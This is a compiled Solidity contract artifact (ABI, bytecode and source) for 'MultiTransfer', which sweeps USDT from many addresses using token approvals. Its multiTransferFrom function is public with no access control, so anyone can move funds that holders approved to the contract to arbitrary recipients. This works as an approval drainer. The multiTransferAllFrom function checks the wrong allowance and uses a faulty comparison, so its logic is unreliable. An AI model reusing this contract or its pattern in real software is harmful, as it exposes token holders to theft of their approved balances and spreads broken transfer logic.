{
  "contractName": "MultiTransfer",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "_spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NotEnoughAllowance",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NotEnoughBalance",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "_spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "OnTransferAll",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "_newUSDTAddress",
          "type": "address"
        }
      ],
      "name": "changeUSDTAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_fromAddresses",
          "type": "address[]"
        },
        {
          "internalType": "uint256[]",
          "name": "_amounts",
          "type": "uint256[]"
        },
        {
          "internalType": "address[]",
          "name": "_toAddresses",
          "type": "address[]"
        }
      ],
      "name": "multiTransferFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_fromAddresses",
          "type": "address[]"
        },
        {
          "internalType": "address",
          "name": "toAddress",
          "type": "address"
        }
      ],
      "name": "multiTransferAllFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405273ea6d2816a7545eb840ebe9111f49a9d9ed84fe926000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c657600080fd5b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610e78806101176000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80630bf3df0f146100465780630d5905541461008a5780639296d3631461026a575b600080fd5b6100886004803603602081101561005c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610342565b005b610268600480360360608110156100a057600080fd5b81019080803590602001906401000000008111156100bd57600080fd5b8201836020820111156100cf57600080fd5b803590602001918460208302840111640100000000831117156100f157600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f8201169050808301925050505050505091929192908035906020019064010000000081111561015157600080fd5b82018360208201111561016357600080fd5b8035906020019184602083028401116401000000008311171561018557600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f820116905080830192505050505050509192919290803590602001906401000000008111156101e557600080fd5b8201836020820111156101f757600080fd5b8035906020019184602083028401116401000000008311171561021957600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f82011690508083019250505050505050919291929050505061046c565b005b6103406004803603604081101561028057600080fd5b810190808035906020019064010000000081111561029d57600080fd5b8201836020820111156102af57600080fd5b803590602001918460208302840111640100000000831117156102d157600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f820116905080830192505050505050509192919290803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610928565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103e8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610e226022913960400191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b8151835114801561047e575080518351145b6104f0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f496e76616c696420696e70757420706172616d6574657273000000000000000081525060200191505060405180910390fd5b60008090505b835181101561092257600084828151811061050d57fe5b60200260200101519050600084838151811061052557fe5b60200260200101519050600084848151811061053d57fe5b6020026020010151905081600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e85306040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050602060405180830381600087803b15801561061d57600080fd5b505af1158015610631573d6000803e3d6000fd5b505050506040513d602081101561064757600080fd5b810190808051906020019092919050505010156106cc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4e6f7420656e6f75676820616c6c6f77616e636500000000000000000000000081525060200191505060405180910390fd5b81600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231856040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561076e57600080fd5b505af1158015610782573d6000803e3d6000fd5b505050506040513d602081101561079857600080fd5b8101908080519060200190929190505050101561081d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4e6f7420656e6f7567682062616c616e6365000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8483856040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050600060405180830381600087803b1580156108fa57600080fd5b505af115801561090e573d6000803e3d6000fd5b5050505050505080806001019150506104f6565b50505050565b60008090505b8251811015610e1c57600083828151811061094557fe5b602002602001015190506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156109f257600080fd5b505af1158015610a06573d6000803e3d6000fd5b505050506040513d6020811015610a1c57600080fd5b810190808051906020019092919050505090506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84336040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050602060405180830381600087803b158015610b0657600080fd5b505af1158015610b1a573d6000803e3d6000fd5b505050506040513d6020811015610b3057600080fd5b810190808051906020019092919050505090507f7e9401bcbb50a509e2c5cbd65fe10175a2d833cd26c4cd064e3ab6c830b7932483338385604051808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200183815260200182815260200194505050505060405180910390a1818111610c9d577f27f700a8e573047b2608055145a8531ae403b4fa061be79d7d0831a1ccfca4a083338385604051808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200183815260200182815260200194505050505060405180910390a1610e0c565b60008211610d15577f4b0d7a1c24f751698dfc9d2f636b1f0930ec1ac13550cbc36c268c366cbdaec98383604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1610e0b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8487856040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050600060405180830381600087803b158015610df257600080fd5b505af1158015610e06573d6000803e3d6000fd5b505050505b5b505050808060010191505061092e565b50505056fe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e2ea265627a7a72315820eef2fa1ded83765fe50e13123b8c6ef611e7df0a0af4903be44e95e736845dbf64736f6c63430005100032",
  "source": "pragma solidity ^0.5.16;\r\n\r\nimport \"./USDT.sol\";\r\n\r\ncontract MultiTransfer {\r\n    address private usdtAddress = 0xea6d2816A7545Eb840EBe9111F49a9D9Ed84fE92; // Default USDT contract address\r\n    TetherToken private USDT = TetherToken(usdtAddress);\r\n    address private owner;\r\n    event OnTransferAll(\r\n        address owner,\r\n        address _spender,\r\n        uint allowance,\r\n        uint amount\r\n    );\r\n    event NotEnoughAllowance(\r\n        address owner,\r\n        address _spender,\r\n        uint allowance,\r\n        uint amount\r\n    );\r\n    event NotEnoughBalance(address owner, uint amount);\r\n\r\n    constructor() public {\r\n        owner = msg.sender; // Set the owner of the contract to the deployer\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only owner can call this function.\");\r\n        _;\r\n    }\r\n\r\n    function changeUSDTAddress(address _newUSDTAddress) public onlyOwner {\r\n        usdtAddress = _newUSDTAddress;\r\n        USDT = TetherToken(_newUSDTAddress);\r\n    }\r\n\r\n    function multiTransferFrom(\r\n        address[] memory _fromAddresses,\r\n        uint256[] memory _amounts,\r\n        address[] memory _toAddresses\r\n    ) public {\r\n        require(\r\n            _fromAddresses.length == _amounts.length &&\r\n                _fromAddresses.length == _toAddresses.length,\r\n            \"Invalid input parameters\"\r\n        );\r\n\r\n        for (uint i = 0; i < _fromAddresses.length; i++) {\r\n            address from = _fromAddresses[i];\r\n            uint256 amount = _amounts[i];\r\n            address to = _toAddresses[i];\r\n\r\n            require(\r\n                USDT.allowance(from, address(this)) >= amount,\r\n                \"Not enough allowance\"\r\n            );\r\n            require(USDT.balanceOf(from) >= amount, \"Not enough balance\");\r\n\r\n            USDT.transferFrom(from, to, amount);\r\n        }\r\n    }\r\n\r\n    function multiTransferAllFrom(\r\n        address[] memory _fromAddresses,\r\n        address toAddress\r\n    ) public {\r\n        for (uint i = 0; i < _fromAddresses.length; i++) {\r\n            address _owner = _fromAddresses[i];\r\n            uint256 amount = USDT.balanceOf(_owner);\r\n            uint256 allowance = USDT.allowance(_owner, msg.sender);\r\n            emit OnTransferAll(_owner, msg.sender, allowance, amount);\r\n            if (allowance <= amount) {\r\n                emit NotEnoughAllowance(_owner, msg.sender, allowance, amount);\r\n            } else if (amount <= 0) {\r\n                emit NotEnoughBalance(_owner, amount);\r\n            } else {\r\n                USDT.transferFrom(_owner, toAddress, amount);\r\n            }\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "D:\\projects\\USD-Transfer\\tokens\\contracts\\MultiTransfer.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-02-19T16:14:30.383Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}